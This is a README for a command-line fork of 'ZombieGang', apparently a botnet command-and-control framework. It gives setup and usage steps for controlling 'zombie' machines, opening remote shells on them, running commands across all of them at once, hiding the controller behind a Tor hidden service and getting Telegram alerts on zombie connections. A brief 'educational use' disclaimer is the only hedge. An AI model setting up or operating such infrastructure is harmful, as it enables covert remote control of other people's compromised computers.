# ZombieGang v1.0.0 - CLI Edition for Ubuntu VPS

## 🆕 What's New

This fork introduces a **CLI-only version** of ZombieGang specifically optimized for **Ubuntu VPS** deployment with:

- ✅ **No Web Interface** - Streamlined CLI for minimal resource usage
- ✅ **Telegram Notifications** - Real-time alerts for all events
- ✅ **Tor v3 Support** - Full .onion hidden service compatibility
- ✅ **Bug Fixes** - Improved error handling and stability
- ✅ **Production Ready** - Comprehensive documentation and setup scripts

## 🚀 Quick Start

```bash
# 1. Clone repository
git clone https://github.com/bitbybit91/zombiegang.git
cd zombiegang/master-client

# 2. Install dependencies
pip3 install -r requirements.txt

# 3. Configure (optional)
cp .env.example .env
nano .env  # Add Telegram credentials

# 4. Start CLI
./start_cli.sh
```

## 📖 Documentation

- **[Quick Start Guide](CLI_QUICK_START.md)** - Get started in 5 minutes
- **[Complete Setup Guide](CLI_SETUP_UBUNTU.md)** - Full Ubuntu VPS setup
- **[CLI Documentation](master-client/README_CLI.md)** - Complete CLI reference
- **[Changelog](CHANGELOG_v1.0.0.md)** - What's new in v1.0.0

## 🎯 Key Features

### Telegram Integration
Get real-time notifications on Telegram:
- 🔐 Master login/logout
- 🧟 Zombie connections/disconnections
- 🔗 Remote shell sessions
- ✅ Task completions
- ❌ Errors and failures

### Tor v3 Hidden Services
- Anonymous .onion addresses
- No public IP required
- End-to-end encryption
- DNS resolution through proxy

### CLI Interface
- Efficient command-line interface
- Multi-zombie control
- Session management
- Task scheduling
- Proxy support

## 🔒 Security

- ✅ CodeQL security scan passed (0 alerts)
- ✅ Improved exception handling
- ✅ No hardcoded credentials
- ✅ Environment-based configuration
- ✅ Tor anonymity support

## 💻 System Requirements

- Ubuntu 18.04 LTS or newer
- Python 3.8+
- 1GB RAM minimum
- 10GB disk space

## 📦 Installation

### Full Installation

See **[CLI_SETUP_UBUNTU.md](CLI_SETUP_UBUNTU.md)** for complete step-by-step guide.

### Quick Test

```bash
cd master-client
python3 cli.py
```

Then in CLI:
```
set USER your-username
set PSWD
set RHOST localhost:8080
login
```

## 🔧 Configuration

### Telegram Setup

1. Create bot with [@BotFather](https://t.me/BotFather)
2. Get your chat ID from [@userinfobot](https://t.me/userinfobot)
3. Set environment variables:

```bash
export TELEGRAM_BOT_TOKEN='your-bot-token'
export TELEGRAM_CHAT_ID='your-chat-id'
```

Or add to `.env` file.

### Tor Setup

1. Install Tor: `sudo apt-get install tor`
2. Configure hidden service in `/etc/tor/torrc`
3. Restart Tor: `sudo systemctl restart tor`
4. Get address: `sudo cat /var/lib/tor/zombiegang/hostname`

## 📊 Comparison

### v1.0.0 CLI vs Original Web Version

| Feature | CLI v1.0.0 | Web Original |
|---------|------------|--------------|
| Interface | CLI only | Flask web + CLI |
| Memory Usage | Low | Higher |
| Telegram | ✅ Built-in | ❌ Not available |
| Tor v3 | ✅ Full support | ⚠️ Basic |
| Setup | Simple | Complex |
| Resource Usage | Minimal | Moderate |
| Ubuntu VPS | ✅ Optimized | ✅ Compatible |
| Dependencies | Minimal | Many |

## 🎓 Usage Examples

### Basic Commands
```bash
# List zombies
get zombies

# Start remote shell
start 1
whoami
ls -la
stop 1

# Multiple zombies
set SESSION all
whoami
```

### With Tor
```bash
set PXHOST 127.0.0.1
set PXPORT 9050
proxy
set RHOST your-address.onion
login
```

## 🐛 Bug Fixes in v1.0.0

1. **Fixed bare except clauses** - Proper exception handling
2. **Fixed json.load() error** - Changed to json.loads()
3. **Improved error logging** - Better debugging
4. **Fixed proxy DNS resolution** - Using socks5h://

## 🤝 Contributing

Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request

## 📄 License

GNU General Public License v3.0

## 🔗 Links

- **Original Project**: [r3nt0n/zombiegang](https://github.com/r3nt0n/zombiegang)
- **This Fork**: [bitbybit91/zombiegang](https://github.com/bitbybit91/zombiegang)
- **Issues**: [Report a bug](https://github.com/bitbybit91/zombiegang/issues)

## ⚠️ Disclaimer

For educational and authorized testing only. Unauthorized use is illegal. Authors not responsible for misuse.

## 🙏 Credits

- **r3nt0n** - Original ZombieGang framework
- **Contributors** - Community contributions
- **You** - For using ZombieGang CLI

---

**Version**: 1.0.0  
**Status**: Stable  
**Platform**: Ubuntu VPS  
**Last Updated**: 2025

**Get Started**: Read [CLI_QUICK_START.md](CLI_QUICK_START.md) →
